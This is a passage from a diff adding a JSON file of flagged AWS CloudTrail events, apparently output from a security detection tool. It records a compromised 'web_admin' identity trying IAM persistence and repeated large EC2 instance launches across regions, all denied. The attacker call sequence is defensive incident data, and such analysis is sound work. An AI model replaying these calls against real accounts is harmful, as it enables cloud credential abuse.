+       "cloudtrail.json:392",
+       "cloudtrail.json:393",
+       "cloudtrail.json:396",
+       "cloudtrail.json:399",
+       "cloudtrail.json:401",
+       "cloudtrail.json:402",
+       "cloudtrail.json:405",
+       "cloudtrail.json:408",
+       "cloudtrail.json:412",
+       "cloudtrail.json:416"
+      ]
+     }
+    ],
+    "events": [
+     {
+      "ref": "cloudtrail.json:345",
+      "ts": "2018-08-20T09:16:12+00:00",
+      "source": "cloudtrail",
+      "action": "iam:CreateUser",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "35.153.154.221",
+      "rules": [
+       "CT_IAM_PERSISTENCE"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "AKIAJOGC********XUPA",
+      "errorCode": "AccessDenied",
+      "userAgent": "Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:347",
+      "ts": "2018-08-20T09:16:12+00:00",
+      "source": "cloudtrail",
+      "action": "iam:CreateAccessKey",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "35.153.154.221",
+      "rules": [
+       "CT_IAM_PERSISTENCE"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "AKIAJOGC********XUPA",
+      "errorCode": "AccessDenied",
+      "userAgent": "Boto3/1.7.44 Python/2.7.12 Linux/4.4.0-1063-aws Botocore/1.10.44",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:352",
+      "ts": "2018-08-20T09:16:16+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeKeyPairs",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"keySet\": {}, \"filterSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:353",
+      "ts": "2018-08-20T09:16:17+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeKeyPairs",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"keySet\": {}, \"filterSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "sa-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:354",
+      "ts": "2018-08-20T09:16:17+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:CreateDefaultVpc",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"CreateDefaultVpcRequest\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:355",
+      "ts": "2018-08-20T09:16:17+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeKeyPairs",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"keySet\": {}, \"filterSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "ap-northeast-2"
+     },
+     {
+      "ref": "cloudtrail.json:356",
+      "ts": "2018-08-20T09:16:18+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:CreateDefaultVpc",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"CreateDefaultVpcRequest\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "sa-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:358",
+      "ts": "2018-08-20T09:16:18+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:CreateDefaultVpc",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"CreateDefaultVpcRequest\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "ap-northeast-2"
+     },
+     {
+      "ref": "cloudtrail.json:359",
+      "ts": "2018-08-20T09:16:20+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:360",
+      "ts": "2018-08-20T09:16:21+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "sa-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:361",
+      "ts": "2018-08-20T09:16:21+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "ap-northeast-2"
+     },
+     {
+      "ref": "cloudtrail.json:388",
+      "ts": "2018-08-20T09:16:45+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-41e0b93b\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c4.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:392",
+      "ts": "2018-08-20T09:16:49+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-1157157d\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c4.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "sa-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:393",
+      "ts": "2018-08-20T09:16:49+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-41e0b93b\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c3.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:396",
+      "ts": "2018-08-20T09:16:50+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-41e0b93b\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r3.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:399",
+      "ts": "2018-08-20T09:16:53+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-41e0b93b\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r4.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "us-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:401",
+      "ts": "2018-08-20T09:16:54+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-1157157d\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r3.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "sa-east-1"
+     },
+     {
+      "ref": "cloudtrail.json:1091",
+      "ts": "2018-08-20T09:28:07+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:DescribeInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"filterSet\": {}, \"instancesSet\": {}}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1106",
+      "ts": "2018-08-20T09:28:28+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c4.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1109",
+      "ts": "2018-08-20T09:28:31+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c3.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1111",
+      "ts": "2018-08-20T09:28:32+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r3.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1112",
+      "ts": "2018-08-20T09:28:34+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r4.8xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1116",
+      "ts": "2018-08-20T09:28:39+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c4.4xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1119",
+      "ts": "2018-08-20T09:28:43+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c3.4xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1121",
+      "ts": "2018-08-20T09:28:45+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r4.4xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1123",
+      "ts": "2018-08-20T09:28:46+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"i3.4xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1125",
+      "ts": "2018-08-20T09:28:47+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"r3.4xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1128",
+      "ts": "2018-08-20T09:28:51+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"c4.2xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1129",
+      "ts": "2018-08-20T09:28:51+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"m5.2xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1130",
+      "ts": "2018-08-20T09:28:52+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"m3.2xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1131",
+      "ts": "2018-08-20T09:28:53+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"m4.2xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     },
+     {
+      "ref": "cloudtrail.json:1132",
+      "ts": "2018-08-20T09:28:54+00:00",
+      "source": "cloudtrail",
+      "action": "ec2:RunInstances",
+      "outcome": "failure",
